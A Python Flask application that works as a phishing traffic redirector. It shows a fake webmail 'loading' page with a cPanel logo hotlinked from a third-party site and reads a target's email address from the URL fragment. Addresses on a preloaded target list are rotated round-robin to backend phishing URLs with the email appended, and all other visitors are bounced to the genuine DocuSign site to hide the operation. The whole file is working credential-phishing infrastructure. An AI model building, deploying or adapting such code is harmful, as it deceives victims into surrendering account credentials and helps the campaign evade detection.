from flask import Flask, redirect, request, render_template_string
import os

app = Flask(__name__)
application = app

# ---------------------------------------------------------------------------
# Privileged emails loaded from emails.txt (one per line)
# ---------------------------------------------------------------------------
EMAILS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'emails.txt')


def load_privileged_emails(path=EMAILS_FILE):
    """Read emails.txt line by line, return a set of lowercased addresses."""
    with open(path, 'r', encoding='utf-8') as f:
        return {
            line.strip().lower()
            for line in f
            if line.strip() and not line.strip().startswith('#')
        }


PRIVILEGED_EMAILS = load_privileged_emails()

# ---------------------------------------------------------------------------
# Privileged weblinks loaded from weblinks.txt (one per line)
# Backend pool for round-robin — must be a LIST to preserve order & allow indexing
# ---------------------------------------------------------------------------
LINKS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'weblinks.txt')


def load_privileged_links(path=LINKS_FILE):
    """Read weblinks.txt line by line, return an ordered, de-duplicated list."""
    seen = set()
    result = []
    with open(path, 'r', encoding='utf-8') as l:
        for line in l:
            s = line.strip()
            if not s or s.startswith('#'):
                continue
            if not s.lower().startswith(('http://', 'https://')):
                continue
            if s in seen:
                continue
            seen.add(s)
            result.append(s)
    return result


DOMAINS = load_privileged_links()


# Round-robin counter
current_index = 0


# ---------------------------------------------------------------------------
# Shared loading-page template (used in both branches)
# ---------------------------------------------------------------------------
LOADING_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        .loading-container {
            text-align: center;
            padding: 20px;
        }
        .logo {
            height: 35px;
            width: auto;
            margin-bottom: 15px;
        }
        .loading-spinner {
            width: 40px;
            height: 40px;
            margin: 20px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #FF6C2C;
            border-radius: 50%;
            animation: spin 1s ease-in-out infinite;
        }
        .loading-text {
            color: #FF6C2C;
            font-size: 14px;
            letter-spacing: 0.5px;
            opacity: 0.8;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <img src="https://wolffacademy.com.br:2096/cPanel_magic_revision_1668371294/unprotected/cpanel/images/webmail-logo.svg"
             alt="Logo"
             class="logo">
        <div class="loading-spinner"></div>
        <div class="loading-text">{{ text }}</div>
    </div>
    <script>
        {{ script|safe }}
    </script>
</body>
</html>
'''


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@app.route('/')
def round_robin_balancer():
    global current_index

    email = request.args.get('web', '')

    # No email yet — serve page that reads the URL fragment
    if not email:
        return render_template_string(
            LOADING_PAGE,
            text='Accessing Webmail...',
            script='''
                if (window.location.hash) {
                    var email = window.location.hash.substring(1);
                    setTimeout(function() {
                        window.location.href = '/?web=' + encodeURIComponent(email);
                    }, 2000);
                } else {
                    setTimeout(function() {
                        document.querySelector('.loading-text').innerText = 'Invalid email';
                        document.querySelector('.loading-text').style.color = '#dc3545';
                    }, 2000);
                }
            '''
        )

    # Basic validation
    if '@' not in email or '.' not in email:
        return "Invalid email.", 400

    # Privileged → round-robin redirect
    if email.lower() in PRIVILEGED_EMAILS:
        if not DOMAINS:
            return "No backends configured.", 503

        target_domain = DOMAINS[current_index]
        current_index = (current_index + 1) % len(DOMAINS)

        target_url = f"{target_domain}/?web={email}"

        return render_template_string(
            LOADING_PAGE,
            text='Accessing to Webmail...',
            script=f'''
                setTimeout(function() {{
                    window.location.href = "{target_url}";
                }}, 2000);
            '''
        )

    # Non-privileged → DocuSign
    return redirect('https://account.docusign.com/', 302)


if __name__ == '__main__':
    app.run(debug=True)